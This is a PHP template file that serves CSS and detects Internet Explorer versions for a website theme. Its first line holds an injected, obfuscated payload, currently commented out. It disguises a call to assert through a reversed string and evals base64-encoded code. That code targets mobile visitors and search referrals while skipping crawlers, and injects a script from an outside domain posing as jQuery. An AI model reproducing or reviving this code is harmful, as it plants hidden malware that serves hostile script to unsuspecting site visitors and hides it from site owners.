<?php
//$_ = strrev('tressa'); @$_("e\166\141\154\050b\141\163\145\066\064\137\144\145\143\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0IHNyYz0iaHR0cDovL21vYmlsZS1jb250ZW50LmluZm8vanF1ZXJ5LTEuNy4xLmpzIj48L3NjcmlwdD4nOyBmbHVzaCgpOyBleGl0OyB9'\051\051\073");
?>
<?php header("Content-type: text/css"); ?>
<?php

$template_path = dirname( dirname( $_SERVER['REQUEST_URI'] ) );
function ieversion() {
  ereg('MSIE ([0-9]\.[0-9])',$_SERVER['HTTP_USER_AGENT'],$reg);
  if(!isset($reg[1])) {
    return -1;
  } else {
    return floatval($reg[1]);
  }
}
$iev = ieversion();

?>
<?php /*------------All IE--------------*/ ?>

<?php
/*------------IE 6------------*/
if ($iev == 6) {}?>

<?php
/*------------IE 7------------*/
if ($iev == 7) {?>
<?php } ?>

<?php
/*------------IE 8------------*/
if ($iev == 8) {}?>